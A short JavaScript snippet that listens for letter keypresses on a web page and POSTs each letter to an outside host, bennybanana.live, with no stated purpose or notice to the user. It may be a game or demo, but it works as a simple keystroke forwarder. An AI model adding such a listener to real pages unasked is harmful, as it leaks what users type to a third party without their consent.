function init() {
    console.log("initialized");
    document.body.addEventListener("keydown", (ev) => {
        if (/^[a-zA-z]$/.test(ev.key)) {
            submitKey(ev.key);
        }
    });
}

async function submitKey(key) {
    const response = await fetch("http://bennybanana.live/POST", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ letter: key })
    })
}